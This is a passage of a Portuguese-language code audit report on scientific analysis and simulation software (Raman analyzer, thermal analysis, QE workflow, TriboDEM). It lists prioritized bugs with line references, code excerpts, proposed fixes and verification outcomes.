   já ter escrita na home do usuário (ou ser o próprio app, que grava o modelo ao treinar:
   `gui.py:1179`, `qt_classif.py:91`).
4. **A parte "falha de leitura engolida em silêncio" é falsa.** Quando a carga falha, a
   interface mostra **"Random Forest peak AI: not trained"** (`gui.py:897-900`,
   `qt_classif.py:491`). O `except Exception: continue` fica em `raman_ai.py:556` e o
   `continue` em `557` (o achado apontava 556 para os dois).

**O que sobra é uma inconsistência real de tratamento de risco:** o caminho do `.rpa`
— que é o **verdadeiro** vetor de "arquivo que veio de outra máquina" — pede confirmação,
enquanto o modelo da home, que é de confiança equivalente (gravado pelo próprio app),
é carregado em silêncio. A correção abaixo continua válida, mas como **consistência de UX**,
não como fechamento de buraco crítico.

**Correção (mantida, prioridade baixa):** reaproveitar o aviso do `i18n.py:526-529`
quando o modelo **do usuário** for carregado automaticamente (em `carregar_padrao_se_existir`),
deixando o modelo embutido (`CAMINHO_MODELO_EMBUTIDO`) carregar em silêncio — ele é
confiável por construção.

**Toca o fluxo do Yuri:** sim, mas o efeito é uma confirmação a mais ao abrir o app.
Não impede o uso.

**Estado:** verificado por 3 lentes adversárias — sobrevive 2 de 3, severidade corrigida
ALTO → BAIXO.

---

## PRIORIDADE 19 — DA: falha na extração de variáveis degrada a série inteira sem aviso (MÉDIO → BAIXO, verificado)

**Arquivo:** `C:\Users\yuri\OneDrive\Desktop\Claude\DA\raman_phase_analyzer\input_data.py:92-123`
(chamado em `qt_app.py:826` e `gui.py:3521`)

Quando `extrair_variaveis_do_conjunto` levanta `ValueError`, o chamador **não aborta** —
ele degrada a série inteira:
```python
# qt_app.py:825-829 (idêntico em gui.py:3520-3525)
try:
    classes = extrair_variaveis_do_conjunto([c.name for c in validos])
except Exception as erro:
    erros.append(str(erro))
    classes = [("indice_espectro", float(i + 1)) for i in range(len(lidos))]
```
O eixo vira o fictício **"Spectrum 1..N"** (índice do arquivo), e a série toda passa a ser
analisada como se não tivesse variável experimental nenhuma.

**Estado: verificado por 3 lentes adversárias — sobrevive 1 de 3, severidade corrigida
ALTO → BAIXO.** Motivos:
1. **O gatilho alegado não existe.** A `ValueError` só é levantada em `input_data.py:113`
   quando o nome do arquivo **não tem NENHUM dígito**. Nome com dígito cai em
   `input_data.py:114-115` e segue para `input_data.py:116-123` **sem exceção**. Ou seja,
   o exemplo do achado (`espectro_1.txt`, `espectro_2.txt`) **não reproduz** — com dígitos
   o lote é classificado como pressão/temperatura, nunca como `indice_espectro`.
2. **O título do achado ("sem aviso ao usuário") contradiz o próprio corpo do achado.**
   Há aviso: o erro entra em `erros` (`gui.py:3524` / `qt_app.py:828`) e aparece em
   `messagebox.showwarning` / `QMessageBox.warning` (`gui.py:3539-3540`, `qt_app.py:831-832`)
   com o texto exato *"Não foi possível encontrar número no nome: `<arquivo>`"*. Nada se perde;
   renomear o arquivo e recarregar resolve.
3. **A degradação é visível na tela.** A lista lateral passa a mostrar "Spectrum 1..N"
   (`gui.py:3532-3533`, `qt_app.py:843`) e o eixo sai rotulado **"Spectrum index"**
   (`qt_app.py:550`, `input_data.py:23-24`). O usuário não precisa adivinhar.

**O que sobra de real (e o achado inverteu o problema):**
- Um **único** arquivo sem dígito rebaixa o **lote inteiro**, e por `analysis.py:615`
  (`eh_ftir = all(e.tipo_variavel == "indice_espectro" ...)`) o lote passa a ser tratado
  como FTIR — região = faixa completa em vez das janelas Raman de 400/500 cm⁻¹. Isso muda
  números publicados. Mas o usuário vê o aviso, vê "Spectrum N" na lista e vê "Spectrum index"
  no eixo.
- Bug de rótulo de UI: o diálogo se chama **"Arquivos ignorados"** (`i18n.py:435`) quando
  **nenhum** arquivo foi ignorado. O corpo da mensagem é preciso, o título não.
- **O problema real, invertido pelo achado:** nomes só com dígitos (sem unidade) são
  rotulados **silenciosamente** como `pressao` com valores GPa **fabricados**
  (`input_data.py:114-122`): `espectro_1.txt` vira "1 GPa", `espectro_2.txt` vira "2 GPa" —
  sem nenhum aviso. E uma data no nome vira temperatura absurda: `2024_espectro.txt` →
  **2024 K**. Isso **é** erro científico silencioso e virou a **PRIORIDADE 24**.

**Correção (prioridade baixa):** trocar o título do diálogo ("Arquivos ignorados" →
algo como "Variável experimental não reconhecida") e não derrubar o lote inteiro: nomear
só os arquivos sem variável identificável e manter os demais com o valor real.

**Toca o fluxo do Yuri:** pouco no fluxo normal (os nomes dele têm GPa/K explícitos, e nesse
caso o ramo explícito nunca chega ao teste de ambiguidade). O risco real está na
PRIORIDADE 24.

**Estado:** verificado por 3 lentes adversárias — sobrevive 1 de 3, severidade corrigida
ALTO → BAIXO.

---

## PRIORIDADE 20 — DA: conversão TG de mg para % divide por zero (MÉDIO → BAIXO, verificado)

**Arquivo:** `C:\Users\yuri\OneDrive\Desktop\Claude\DA\raman_phase_analyzer\termico\analise.py:97-98`

```python
# analise.py:97-98
if tg is not None and iM < len(cab) and re.search(r"mg\b", cab[iM]) and not re.search(r"%", cab[iM]):
    tg = 100 * tg / tg[0]      # <-- sem proteção: tg[0] == 0 → inf/nan em toda a curva
```
Sem guarda, `tg[0] == 0` (primeiro ponto da curva com massa 0 — muito comum em TG,
onde a massa inicial medida pode ser lida como 0.000 por causa do offset do instrumento)
produz `inf`/`nan` em **toda** a curva de perda de massa. O resto do módulo consome `a.tg`
sem checar (`analise.py:160-162` faz `np.gradient` da curva; `analise.py:200` grava
`a.tg[-1]` no CSV; `analise.py:283` plota).

**Correção:**
```python
if tg is not None and iM < len(cab) and re.search(r"mg\b", cab[iM]) and not re.search(r"%", cab[iM]):
    if tg[0] == 0 or not np.isfinite(tg[0]):
        raise ValueError("Massa inicial (TG) é zero: a conversão mg → % não pode ser feita.")
    tg = 100 * tg / tg[0]
```

**Toca o fluxo do Yuri:** sim, se algum TG dele tiver massa inicial 0 (curve TG de
amostra que perde tudo já no primeiro ponto, ou offset de instrumento). Não toquei nada.

**Estado: verificado por 3 lentes adversárias — sobrevive 2 de 3, severidade corrigida
MÉDIO → BAIXO.** O verificador aceitou o fato e o mecanismo (o ramo `mg` de
`analise.py:97-98` é alcançável pelo painel térmico vivo, `qt_termico.py:94` → `TA.ler`;
e `100*tg/tg[0]` com `tg[0]==0` dá `nan` no primeiro ponto e `inf` nos demais, sem guarda
em `analise.py:160-162`, `:200` e `:283`). Mas rebaixou a gravidade por três motivos:
1. **O gatilho não existe no fluxo documentado** — o único TG de teste
   (`termico_test.py:36`) e as dicas do próprio app (`qt_termico.py:50`, `i18n.py:1018`)
   usam `Mass/%`; nenhum arquivo do repositório tem coluna de massa em mg. Numa corrida
   TG real o primeiro ponto tem a massa total, então zero ali exige tare, offset ou
   exportação corrompida.
2. **Não é silencioso** — o `RuntimeWarning` de divide-by-zero do numpy vai para o console,
   a tabela de eventos grava `inf`/`nan` no resíduo (`analise.py:200`) e o plot da TG fica
   vazio. O Yuri vê que algo quebrou.
3. **A correção proposta não cobre o risco científico real.** O verificador apontou um
   caso vizinho que a minha correção original **não** pegava: `tg[0]` pequeno mas não
   zero, ou arquivo fora de ordem de temperatura — a normalização em `analise.py:98` roda
   **antes** do `argsort` de `analise.py:104`, produzindo curva com mais de 100% **sem
   inf/nan e totalmente silenciosa**. Esse é o caso que merecia a correção.

**Correção revisada (pequena, cobre os dois casos):**
```python
if tg is not None and iM < len(cab) and re.search(r"mg\b", cab[iM]) and not re.search(r"%", cab[iM]):
    if tg[0] <= 0 or not np.isfinite(tg[0]):
        raise ValueError("Massa inicial (TG) é zero ou negativa: a conversão mg → % não pode ser feita.")
    tg = 100 * tg / tg[0]
```
E, para o caso da ordem da temperatura, mover a normalização para **depois** do
`ordem = np.argsort(Tk)` (`analise.py:104`), ou normalizar por `tg[ordem][0]`.

**Prioridade prática:** baixo. Continua valendo corrigir — é 3 linhas e fecha um erro
silencioso — mas não é da mesma gravidade dos achados de resultado científico errado da
rodada 1.

---

## PRIORIDADE 21 — DA: conversão .dpt grava o .txt na pasta de dados brutos do usuário (MÉDIO → BAIXO, verificado)

**Arquivo:** `C:\Users\yuri\OneDrive\Desktop\Claude\DA\raman_phase_analyzer\input_data.py:191-205`

```python
# input_data.py:198-199
caminho_saida = caminho_original.with_name(caminho_original.stem + "_convertido_raman.txt")
with caminho_saida.open("w", encoding="utf-8") as arquivo:
```
O `.txt` derivado é gravado **ao lado do `.dpt` original**, ou seja, dentro da pasta de
dados brutos do Yuri. Chamado em `qt_app.py:814` e `gui.py:3496` — que dispara **automaticamente**
quando ele abre um `.dpt` (sem perguntar).

**Consequências (revisadas pela verificação):**
1. **Sobrescreve sem aviso** — `open("w")` trunca: se o `.txt` já existe (reabrir o mesmo
   `.dpt`), o resultado anterior é perdido sem backup. **Verificado: dano real, mas
   pequeno** — o `.txt` é derivado **determinístico** do `.dpt`, e o `.dpt` nunca é tocado
   (`input_data.py:198` grava outro nome, via `with_name`). Sobrescrever o `.txt` não
   perde nada do Yuri: um clique regenera o mesmo conteúdo.
2. **Quebra em mídia somente-leitura** — CD/DVD de dados, pasta de rede montada em
   somente-leitura: `open("w")` levanta `PermissionError`. **Verificado: o app não fica
   mudo** — o `PermissionError` cai no `except` de `qt_app.py:820-821` e vira aviso
   "Ignored files" (`qt_app.py:832`). O espectro **é** descartado e o erro é visível e
   nomeado. O que sobra é: FTIR fica inutilizável a partir de mídia somente-leitura.
3. **Suja a pasta de origem** — o `.txt` aparece junto dos `.dpt` brutos. **Verificado:
   esta parte da minha alegação original era FALSA** — o app **não varre pasta** (não há
   `listdir`/`iterdir` em `raman_phase_analyzer`); os espectros são escolhidos por
   `QFileDialog`. O `.txt` não entra na lista sozinho, só se o Yuri o selecionar no
   diálogo de arquivos.

**Correção revisada (o que sobrou de verdade):**
Não é "gravar em outra pasta" — isso **quebraria o projeto**: o app guarda o caminho
convertido (`gui.py:3484-3497` → `caminho_uso`, gravado no `.rpa` por
`project_io.py:38` como `nome_arquivo` + o caminho em uso) e depende do `.txt` existir
naquele caminho para reabrir o projeto. O que realmente vale corrigir:
1. **Não escrever em pasta somente-leitura** — gravar o derivado numa pasta de trabalho
   **só quando** a escrita no original falhar, ou sempre, **mantendo o caminho que o
   projeto grava** apontando para o `.txt` de fato usado.
2. **Não gerar sufixo duplo** — `qt_app.py:812` converte **todo** arquivo aberto em modo
   FTIR, inclusive `.txt`; abrir um `.txt` gera
   `nome_convertido_raman_convertido_raman.txt`. É um bug de limpeza verificável.

**Toca o fluxo do Yuri:** sim — toca a pasta de dados dele. Não toquei nada.

**Estado: verificado por 3 lentes adversárias — sobrevive 1 de 3, severidade corrigida
MÉDIO → BAIXO.** A lente "caminho real" sustentou (é automático, as duas interfaces
estão vivas — Qt é o padrão em `__main__.py:78-84`, Tk entra por `--classico`). As lentes
"reprodução" e "severidade" **refutaram**: o dano alegado não se reproduz (o `.dpt` é
intocado, o `.txt` é rederivável, a falha de escrita já tem aviso visível, e a
alegação de "entra na lista como medida original" é falsa). Sobrou ruído de UX e arquivos
espúrios — não perda de dado.

---

## PRIORIDADE 22 — Flow Calculation: leitura de arquivo de saída inteira em vez da cauda (BAIXO)

**Arquivo:** `flowcalc/executor.py:177` (e `:117`, `engines/qe/pipeline.py:91` e `:119`)

```python
# executor.py:177
st = A.pw_status(out.read_text(errors="replace"))
```
O arquivo inteiro vai para a memória como `str` a cada etapa. O **mesmo projeto já resolveu
isso** no módulo de monitoramento — `flowcalc/monitor/runs.py:18-27`:
```python
def parse_qe_output(path, tail_bytes: int = 400_000):
    # "Lê só o fim de saídas grandes (um vc-relax pode ter dezenas de MB)"
```
Um `vc-relax` grande gera centenas de MB; com 21 pressões, cada etapa paga o pico.

**Correção:** extrair o leitor de cauda de `monitor/runs.py` para uma função compartilhada e
usar no executor, preservando a semântica de `pw_status` (procurar "JOB DONE" /
"Error in routine" / "convergence NOT achieved" na varredura em blocos).

**Toca o fluxo do Yuri:** não no resultado — é RAM e tempo. Não toca cálculo rodando
(é leitura passiva).

**Verificadores:** 3 de 3 não refutaram o fato; severidade corrigida de **medium** para
**low** (o alcance é real, mas o impacto alegado foi exagerado).

---

## PRIORIDADE 23 — Flow Calculation: `summary.csv` reescrito sem escrita atômica (BAIXO)

**Arquivo:** `flowcalc/workflow.py:106` (chamada) + `flowcalc/analysis.py:286-291` (escrita)

```python
# analysis.py:286-291
with Path(path).open("w", newline="", encoding="utf-8") as f:
```
`open("w")` trunca o arquivo antes de escrever. O **mesmo projeto já usa escrita atômica**
em `executor.py:107-109` (`tmp` + `os.replace`, com o comentário "escrita atômica: o Monitor
nunca lê um JSON pela metade") e em `fila.py:40-44`.

**Por que ficou BAIXO (o auditor original disse medium):** o `summary.csv` é um **índice
derivado** — todos os campos dele existem em `pressure_XXX_GPa/run.json`, e o próximo run
reconstrói o CSV inteiro. O Monitor **não** lê `summary.csv` (só `progress.json` e o CSV do
nvidia-smi), então não há leitor concorrente que pegue o arquivo pela metade. O pior caso
de um kill no meio da escrita é um CSV vazio (0 bytes), reconstruído no run seguinte.

**Correção (3-4 linhas, reaproveitando o padrão já existente):** gravar em `summary.csv.tmp`
e trocar com `os.replace()` no fim.

**Toca o fluxo do Yuri:** não (recuperável). Baixa prioridade.

**Verificadores:** 2 de 3 não refutaram; o lens de "caminho real" **refutou** por inteiro
(severidade corrigida para `inexistente` nesse lens). Como a regra do projeto é que o achado
sobrevive a 2 de 3, entrou — mas com severidade **low**, e a seção "Achados REFUTADOS"
registra o porquê.

---

## PRIORIDADE 24 — DA: nome de arquivo só com dígitos vira pressão/temperatura INVENTADA, sem aviso (MÉDIO — resultado científico errado, achado novo da rodada 3)

**Arquivo:** `C:\Users\yuri\OneDrive\Desktop\Claude\DA\raman_phase_analyzer\input_data.py:110-122`

Este é o **problema real** que o DA-02 (PRIORIDADE 19) tinha invertido. Quando o nome do
arquivo tem dígito mas **nenhuma unidade** (`GPa`, `K`, `bar`, `°C`…), o código não pergunta
nada: ele **fabrica** uma unidade a partir do número.

```python
# input_data.py:110-115
tokens = [converter_numero(t) for t in re.findall(_NUMERO, stem)]
valores = [v for v in tokens if v is not None]
if not valores:
    raise ValueError(f"Não foi possível encontrar número no nome: {nome}")
resultados.append((None, max(valores)))          # <-- tipo fica None (sem unidade)
numeros_sem_unidade.append(max(valores))

# input_data.py:119-122
elif numeros_sem_unidade:
    maximo = max(numeros_sem_unidade)
    mediana = float(np.median(numeros_sem_unidade))
    dominante = "temperatura" if maximo >= 20.0 or mediana > 10.0 else "pressao"
```

O tipo `None` é preenchido em `input_data.py:123` (`tipo or dominante`) com o **dominante
do lote inteiro**. Casos concretos:

| Nome do arquivo | O que o app mostra | O que é |
|---|---|---|
| `espectro_1.txt`, `espectro_2.txt` | "1 GPa", "2 GPa" | **número de série** lido como gigapascal |
| `2024_espectro.txt` | "2024 K" | **ano** lido como kelvin |
| `run_30_serie.txt` | "30 K" | número de série lido como kelvin |

**Não há nenhum aviso.** O nome do eixo sai "Pressure (GPa)" ou "Temperature (K)" e o
usuário acredita que aquilo é a variável experimental real. Ao contrário do fallback
`indice_espectro` (que pelo menos rotula "Spectrum N" e "Spectrum index"), aqui a
**mentira é plausível** — 1 GPa e 2 GPa são valores de pressão críveis.

**Por que isso é mais grave que a PRIORIDADE 19:** não há degradação visível, não há aviso,
não há como o usuário saber pelo app que o valor foi inventado a partir do nome do arquivo.

**Correção:** quando o nome não traz unidade explícita, **não inventar** — pedir a unidade
ao usuário (ou marcar como `indice_espectro`, que é a representação honesta e já é rotulada
como "Spectrum index"). Mínimo: em `input_data.py:110-115`, quando `tipo` fica `None`,
exigir confirmação do usuário antes de assumir `pressao`/`temperatura`.

**Toca o fluxo do Yuri:** sim, se algum nome de arquivo dele não tiver GPa/K explícito.
Os nomes de exemplo do próprio projeto (`L-arginine_2,5GPa_a.txt`, citado em
`input_data.py:77`) estão no padrão correto, então o risco real é para arquivos novos
que ele nomeia por conta própria.

**Estado:** **verificado adversarialmente em 20/10.** 3 de 3 lentes confirmaram o
achado; severidade mantida em **MÉDIO**. O verificador de severidade acrescentou dois
fatos: (a) a convenção **está documentada** em `README.md:39` ("valores que alcançam
temperaturas usuais ou cuja mediana ultrapassa 10 são classificados como temperatura") —
o comportamento é heurística intencional, mas o app **não mostra na tela** que aplicou
a heurística; (b) **não existe UI para corrigir o tipo inferido** — só renomear o
arquivo e recarregar. Detalhe corrigido: o arquivo **sem** dígito não é "ignorado" — a
`ValueError` faz **o lote inteiro** cair para `indice_espectro` (rotulado "Spectrum N",
com aviso "Arquivos ignorados"). O problema real é o **oposto**: o arquivo **com** dígito
e **sem** unidade é aceito em silêncio como grandeza física inventada, sem nenhum
rótulo de fallback. Agrava: se o lote tiver nomes com unidade explícita de tipos
diferentes, `analysis.py:601-603` estoura *"The dataset mixes incompatible
experimental-variable types."* sem explicar por quê.

---

## PRIORIDADE 25 — TriboDEM: o motor GPU roda com o dobro do passo da CPU e o `fator_dt` não fica gravado no resultado (ALTO — resultado científico errado)

**Arquivo:** `...\TriboDEM_Studio\tribodem\dem_gpu.py:328` · `qt_app.py:476-485` · `experiments.py:93,603` · `yade_worker.py:52`

> 🔄 **Mecanismo corrigido na rodada 5 (verificação adversarial).** A primeira versão deste
> achado dizia que "o sweep de convergência é INÓCUO na GPU" (os 3 casos rodariam com o
> mesmo Δt). **Isso estava errado** e foi refutado por 2 de 3 verificadores. O que
> sobreviveu é outro defeito, exposto abaixo.

O botão "Convergência" cria três casos com `fator_dt` = 1.0 / 0.5 / 0.25
(`qt_app.py:476-485`). O motor GPU multiplica o passo exportado por um fator fixo:

```python
# dem_gpu.py:328
dt = info["dt"] * float(CASO.get("fator_dt_gpu", 2.0))
```

**O `fator_dt` NÃO é ignorado na GPU** — ele chega dentro de `info["dt"]`, que o
exportador de cena já escalou (`yade_worker.py:1628`:
`"dt": tempo_contato() / 20 * FATOR_DT`, com `FATOR_DT` lido de `CASO["fator_dt"]` em
`yade_worker.py:52`). Logo o sweep **varia** o passo: GPU roda `tc/10`, `tc/20`, `tc/40`
para `fator_dt` = 1.0 / 0.5 / 0.25, e a CPU roda `tc/20`, `tc/40`, `tc/80`. O sweep
funciona.

**O que realmente está errado — três defeitos, todos reais:**

1. **A GPU usa o dobro do passo da CPU no mesmo caso.** `dem_gpu.py:328` multiplica por
   2.0 (comentário em `:327`: *"o Hertz da GPU é estável com o dobro do passo
   conservador tc/20 usado na Yade"*), enquanto a CPU usa `O.dt = tempo_contato()/20 *
   FATOR_DT` (`yade_worker.py:2003`). O **critério de convergência não é o mesmo entre
   os dois motores** — na GPU o "dt/2, dt/4" do botão na verdade é "dt/2, dt/4 a partir
   de uma base já dobrada". O Yuri compara GPU e CPU e vê diferença de passo.
2. **O limite validado é violado em silêncio.** `experiments.py:604` valida
   `0 < fator_dt ≤ 1`, mas o passo efetivo da GPU é `fator_dt × 2`, ou seja **até 2× o
   envelope declarado** — sem aviso em log, tela ou `resultado.json`.
3. **A chave `fator_dt_gpu` é morta e não documentada.** Ela não existe no catálogo
   (`experiments.COMUNS`) e **ninguém a grava** — só é lida, com default 2.0. A única
   menção no projeto inteiro é `docs/loop/NOTAS.md:74`, nota interna de desenvolvimento,
   que a descreve como se fosse um fator por caso. Não é erro de física, é inconsistência
   de documentação + chave morta.

**Agrava (achado do verificador de severidade):** a GPU é o motor padrão de **todos** os
casos com partículas (`runner.py:471` `_vai_gpu`, `particulas_na_cpu: 0` em
`testes/realidade.py:138`), o `resultado.json` da GPU grava `dt_s` mas **não** grava
`fator_dt` (o Yade grava, `yade_worker.py:2116`), e **nunca houve comparação mesmo-caso
CPU × GPU** para dimensionar o erro de passo. Casos já viraram número de tese (vida útil
da caçamba v9, `eta_g65` da calibração) sem essa comparação — e um deles já tem
diagnóstico `CHECK` com 34 partículas explodidas
(`docs/loop/rubrica_v9_defletora_cacamba.md:27`).

**Correção mínima:**
```python
# dem_gpu.py:328 — usar a chave validada no catálogo e eliminar a chave morta
dt = info["dt"] * float(CASO.get("fator_dt", 1.0))
```
`experiments.py:93` e `:603` já definem e validam `fator_dt` com `0 < fator ≤ 1`.
Falta gravar no `resultado.json` da GPU o fator **efetivamente usado** (o Yade já faz
isso em `yade_worker.py:2116`).

> ⚠️ **Bloqueado por agora.** `dem_gpu.py` está na lista de arquivos que **não podem ser
> mexidos** enquanto há cálculo rodando. Até o Yuri liberar, a alternativa segura
> **sem tocar no motor** é rodar **um caso de referência nos dois motores** (mesmo caso,
> mesma semente, mesma geometria) e anexar a comparação ao laudo — sem isso, a
> verificação de convergência entre GPU e CPU não é comparável.

**Toca o fluxo do Yuri:** sim — é a verificação de convergência numérica, que ele usa
para dizer que o modelo está validado. **Verificado adversarialmente em 20/10:**
2 de 3 lentes **refutaram** o mecanismo alegado (o sweep não é inócuo); a lente de
severidade **confirmou** os 3 defeitos acima. Severidade final: **ALTO** (era CRÍTICO).

---

## PRIORIDADE 26 — TriboDEM: o tipo "montagem" ficou fora da validação → CFD-DEM com alimentação contínua passa (ALTO)

**Arquivo:** `...\TriboDEM_Studio\tribodem\experiments.py:588,605` · `assistente.py:326-352`

A regra "CFD-DEM precisa de alimentação em batelada" está dentro do bloco:

```python
# experiments.py:588
if tipo in ("chute", "correia", "defletora", "revestimento", "stl"):
    ...
    if caso.get("cfd_dem"):
        erros.append("CFD-DEM needs batch feed (the particle list is fixed when the fluid solver starts).")
```

Mas o catálogo tem `TIPOS_PARTICULAS = ("chute", "correia", "defletora", "revestimento", "stl", "montagem")`
(`experiments.py:390`) — **"montagem" entrou na lista e a validação não acompanhou**.
E a única checagem de `cfd_dem` (`experiments.py:605`) usa `TIPOS_PARTICULAS`, que
**inclui** "montagem" → passa.

**Cenário real:** no Assistente, escolher "Transfer station — hood & spoon" (ou "rock
box"), marcar "Fluid/slurry by CFD-DEM (OpenFOAM 11)" e clicar "Gerar e simular". O
caso nasce `tipo='montagem'`, `alimentacao='flow_rate'` (padrao de `experiments.py:498`)
e `cfd_dem=True`; `validar` **não reclama**; o motor acopla o icoFoamYade com a lista de
partículas **ainda sendo alimentada** — exatamente a condição que a própria mensagem da
linha 602 declara inválida.

**Correção mínima (1 linha):**
```python
# experiments.py:588 — trocar a tupla pela constante, que já é a fonte da verdade
if tipo in TIPOS_PARTICULAS:
```
A linha 589 (limite) continua valendo: "defletora" mantém 250 000, os demais passam a
60 000 (montagem usa 2 000 por padrão e 9 000 no Assistente, folgado). A mesma linha
resolve os demais itens que faltavam para "montagem" (`n_particulas`, `diametro_medio_mm`,
tabela PSD, `0 < fator_dt ≤ 1`).

**Toca o fluxo do Yuri:** sim — é um ensaio de montagem que roda com uma combinação que
o próprio app considera inválida. **Confiança:** alta.

> **VERIFICADO (20/10, lente "reprodução" — sobrevive, severidade ALTO mantida).**
> Cenário real reproduzido: Assistente → "Transfer station — hood & spoon"
> (`assistente.py:28`, `tipo="montagem"`) → passo 4 marca "Fluid/slurry by CFD-DEM"
> (`assistente.py:326-328`; "montagem" não é tribômetro, então a caixa aparece) →
> `_caso()` (`assistente.py:333-358`) monta `alimentacao="flow_rate"`, `cfd_dem=True`,
> `vazao_tph=3000` (`:311`), `n_particulas=9000` (`:313`) → `experiments.validar()`
> devolve **`[]`** (o gatilho de `experiments.py:601` está dentro do bloco da tupla que
> omite "montagem" — **nunca roda**) → o caso entra na fila sem reclamar.
>
> **Correção ao mecanismo alegado:** o defeito é **mais claro** do que o enunciado diz.
> O motor **não** acopla "a lista ainda sendo alimentada" — acopla uma lista **VAZIA**:
> `yade_worker.py:715-717` (`lote_inicial`) retorna sem criar partícula porque
> `vazao > 0`; `preparar_cfd` roda **antes** da alimentação (`yade_worker.py:2008-2009`)
> e chama `fc.setIdList(alim.esferas)` com lista vazia (`yade_worker.py:1915`); a
> alimentação só é instalada depois (`:2049-2052`), então **as partículas nascidas
> depois nunca entram no acoplamento**. Resultado: simulação rotulada "CFD-DEM/polpa"
> que é numericamente **equivalente a DEM seco**.
>
> **Ressalva:** o preset "Bucket & teeth" **não** é afetado — `cad.CASO_ESCAVACAO`
> (`cad.py:574-577`) força `cfd_dem=False` e é aplicado **depois** (`assistente.py:353-354`).
> Atinge `transfer_hs` e `transfer_rb`. Também: `runner.py:468` desvia caso com `cfd_dem`
> do motor GPU para a Yade de CPU.
>
> **Por que ALTO e não CRÍTICO:** não há crash garantido nem perda de arquivo — a
> simulação roda até o fim e entrega número. Mas o número é **silenciosamente errado**
> (polpa declarada, DEM seco entregue), sem aviso na tela: a mensagem de
> `experiments.py:602` existe traduzida em `gui.py:727-728`, mas o gatilho é
> inalcançável para "montagem".

---

## PRIORIDADE 27 — TriboDEM: STL externo sem validação → peça entra na simulação com malha VAZIA (MÉDIO)

**Arquivo:** `...\TriboDEM_Studio\tribodem\cad.py:1045-1055` · `cad_qt.py:266-273` · `cad_gui.py:728`

`cad.ler_stl` lê o arquivo e faz o reshape **sem nenhuma validação**:

```python
# cad.py:1053-1055
vert = [list(map(float, l.split()[1:4])) for l in dados.decode("utf-8", "ignore").splitlines() if l.strip().startswith("vertex")]
t = np.array(vert).reshape(-1, 3, 3)          # SEM VALIDAÇÃO
return Malha(t.reshape(-1, 3), np.arange(len(t) * 3).reshape(-1, 3))
```

A versão **validada do mesmo leitor já existe** em outro módulo — `geometry.py:91-92`:
`if not vert or len(vert) % 3: raise ValueError("Invalid STL file.")`. O `cad.py`
ficou para trás.

**Dois modos de falha:**
1. **Crash confuso:** `reshape(-1,3,3)` estoura com `cannot reshape array of size N into
   shape (3,3)` — mensagem que não diz nada sobre STL inválido. No TriboCAD **Tk**
   (`cad_gui.py:728`) o traceback aparece e a peça não entra.
2. **Falha silenciosa (pior):** no TriboCAD **Qt**, `cad_qt.py:266-273` captura a
   exceção e **substitui a peça por uma `Malha()` vazia**, mostrando só um aviso
   efêmero na barra de status. A peça continua na montagem e exporta um STL sem faces
   (`cad.py:946`): o minério **atravessa a parede** e o desgaste do revestimento sai
   errado, sem erro e sem aviso no resultado.
3. Variante silenciosa: um ASCII com `vertex nan nan nan` passa `float('nan')` e produz
   malha com NaN, que o motor DEM consome sem reclamar.

**Correção (3-4 linhas, reusando a regra que já existe):**
```python
# cad.py:1053-1055
vert = [list(map(float, l.split()[1:4])) for l in dados.decode("utf-8", "ignore").splitlines() if l.strip().startswith("vertex")]
if not vert or len(vert) % 3:
    raise ValueError("Invalid STL file.")
t = np.array(vert, float).reshape(-1, 3, 3)
if not np.isfinite(t).all():
    raise ValueError("Invalid STL file (non-finite coordinates).")
```
Em `cad_qt.py:270-272`, **não** trocar a peça por `Malha()` vazia em caso de erro —
marcar a peça como inválida e **impedir a exportação** (o aviso na barra de status não
pode ser a única informação).

**Toca o fluxo do Yuri:** sim — é a principal entrada de geometria do TriboCAD.
**Verificado adversarialmente em 20/10:** o caminho existe e é alcançável
(`cad.py:1054` — `np.array([]).reshape(-1,3,3)` devolve `(0,3,3)` **sem erro**, então um
STL vazio/truncado não levanta exceção nenhuma). A peça sem faces passa por
`exportar_para_simulacao` (`cad.py:931-952`), que **não** filtra malha vazia, e o
`yade_worker.py:1151` importa um STL de 0 facetas — a peça **some do cenário sem
erro**. Severidade corrigida de ALTO para **MÉDIO**, porque o modo mais perigoso
(STL vazio/truncado) é **100% silencioso** (sem exceção, sem aviso) enquanto o modo
barulhento (contagem de vértices não múltipla de 3) já mostra aviso na barra de status
(`cad_qt.py:271`). **Ressalva:** a falha silenciosa atinge sobretudo o STL vazio; o caso
não-múltiplo-de-3 é barulhento, mas a peça vazia ainda é exportada e simulada como se
tivesse geometria.

---

## PRIORIDADE 28 — TriboDEM: a janela de Resultados mistura casos de lotes anteriores (MÉDIO)

**Arquivo:** `...\TriboDEM_Studio\tribodem\qt_app.py:1077-1084` (+ `:555-558`, `:811`) · `gui.py:645-674`

```python
# qt_app.py:1077
pastas = [p.parent for p in self.pasta.glob("*/resultado.json")] or ([self.pasta] if (self.pasta / "resultado.json").exists() else [])
for p in sorted(pastas):
    r = json.loads((p / "resultado.json").read_text(encoding="utf-8"))   # sem filtrar pelo lote
```

A pasta de lote é **reaproveitada pelo nome**; o app só avisa que "casos com o mesmo ID
serão sobrescritos" (`qt_app.py:555-558`) — não avisa que os casos **antigos ficam lá**.
Ao refazer só o `CHUTE_01` com o mesmo nome de lote, os subdiretórios de
`CORREIA_01` e `DEFLETORA_01` (do lote anterior) continuam lá. A tabela de Resultados
mostra as três linhas, **sem coluna de lote nem de data**: o Yuri lê massa perdida /
vida útil de simulações **antigas** como se fossem do ensaio que acabou de rodar. O
botão "Vídeos" (`qt_app.py:811`) lista os `.mp4` antigos também.

**Correção — duas opções:**
- **A (recomendada):** em `qt_app.py:553-558` (`_rodar`), ao reaproveitar uma pasta não
  vazia, **renomear a pasta antiga** para `<nome>_anterior_<data-hora>` e começar o lote
  novo numa pasta nova. Resolve a mistura **e** devolve o backup dos resultados
  anteriores (hoje o `resultado.json` sobrescrito não tem cópia).
- **B:** na tabela, filtrar pelos IDs declarados no `lote.json`, ou carimbar cada
  `resultado.json` com nome + data do lote e mostrar essa coluna.

**Toca o fluxo do Yuri:** sim — é a tela de onde sai o número que ele leva para a
discussão de projeto. **Confiança:** média.

> **Verificado adversarialmente em 20/10 (severidade MÉDIO confirmada).** A pasta do
> lote é reutilizada por padrão (o nome fica salvo na config) e **não é limpa no
> início** — e `runner.copiar` faz `rmtree` + `copytree` por `id`
> (`runner.py:354-357`), então os casos que **não** estão no lote novo **continuam
> na mesma pasta**.
>
> A janela de Resultados que o Monitor abre (`qt_app.py:780`) faz glob de
> `*/resultado.json` (`qt_app.py:1077-1084`) e mostra `id`,
> `desgaste_especifico_g_por_t` e `vida_estimada_revestimento_h` **sem coluna de
> lote, sem timestamp e sem marcador de obsolescência** — o Yuri lê vida e desgaste
> de um caso antigo como se fossem do lote atual.
>
